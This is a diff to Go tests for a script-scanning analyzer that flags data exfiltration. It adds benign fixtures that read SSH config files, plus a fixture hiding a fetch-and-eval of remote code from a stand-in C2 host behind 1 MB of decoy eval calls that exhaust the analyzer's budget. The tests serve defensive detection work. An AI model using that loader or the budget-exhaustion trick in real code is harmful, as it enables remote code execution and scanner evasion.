@@ -25,6 +25,10 @@ type scriptReport struct {
 	Coverage struct {
 		FilesSeen     int `json:"files_seen"`
 		FilesAnalyzed int `json:"files_analyzed"`
+		Skipped       []struct {
+			Path   string `json:"path"`
+			Reason string `json:"reason"`
+		} `json:"skipped"`
 	} `json:"coverage"`
 }
 
@@ -213,6 +217,26 @@ def get(url):
 			wantScoreAtMost: 0,
 		},
 		{
+			name: "benign ssh config helper reads the ssh config and opens a connection",
+			setup: filesRepo(map[string]string{"hosts.js": "const fs = require('fs');\nconst net = require('net');\nconst path = require('path');\nconst os = require('os');\n" +
+				"const cfg = fs.readFileSync(path.join(os.homedir(), '.ssh', 'config'), 'utf8');\n" +
+				"const known = fs.readFileSync(os.homedir() + '/.ssh/known_hosts', 'utf8');\n" +
+				"const host = /^Host (\\S+)/m.exec(cfg)[1];\nnet.connect(22, host).end(known.length + '\\n');\n"}),
+			wantCode:        0,
+			wantAbsent:      []string{"GAL-EXFIL-001"},
+			wantScoreAtMost: 5,
+		},
+		{
+			name: "benign requester copies the environment to drop the proxy variables",
+			setup: filesRepo(map[string]string{"requester.py": "import os\nimport requests\n\n\nclass Requester:\n    def __init__(self):\n        self._http_requester = requests.Session()\n\n" +
+				"    def get(self, url, **kwargs):\n        popped = False\n        old_env = dict(os.environ)\n" +
+				"        for var_name in (\"http_proxy\", \"https_proxy\", \"no_proxy\"):\n            popped = True if os.environ.pop(var_name, None) else popped\n" +
+				"        try:\n            return self._http_requester.get(url, **kwargs)\n        finally:\n            if popped:\n                os.environ.clear()\n                os.environ.update(old_env)\n"}),
+			wantCode:        0,
+			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002"},
+			wantScoreAtMost: 5,
+		},
+		{
 			name: "benign aws config loader defines where its files live",
 			setup: filesRepo(map[string]string{"index.js": `'use strict';
 const { join } = require('path');
@@ -313,6 +337,42 @@ module.exports = { loadSharedConfigFiles, httpRequest };
 			}
 			if rep.Coverage.FilesAnalyzed != rep.Coverage.FilesSeen {
 				t.Errorf("analyzed %d of %d files", rep.Coverage.FilesAnalyzed, rep.Coverage.FilesSeen)
+			}
+		})
+	}
+}
+
+// P2, P3: a script cannot hide a payload by filling the analyzer's work budget.
+func TestScriptBudgetIsNotClean(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		setup func(t *testing.T) string
+		// expectations
+		wantCode int
+		wantSkip string
+	}{
+		{
+			name: "1 MB of decoy eval calls before a download that is run",
+			setup: filesRepo(map[string]string{"loader.js": strings.Repeat("eval(", 1<<20/5) + "\n" +
+				"eval(await (await fetch('https://c2.sinkhole.test/p.js')).text());\n"}),
+			wantCode: 10,
+			wantSkip: "budget",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			// Given a script whose decoys use up the work budget
+			target := tt.setup(t)
+			// When the agent analyzes it
+			rep := analyzeScript(t, target, tt.wantCode)
+			// Then the file is reported as not fully checked, and the verdict is not clean
+			var got string
+			for _, s := range rep.Coverage.Skipped {
+				got = s.Reason
+			}
+			if got != tt.wantSkip {
+				t.Errorf("skipped = %+v, want reason %q", rep.Coverage.Skipped, tt.wantSkip)
 			}
 		})
 	}
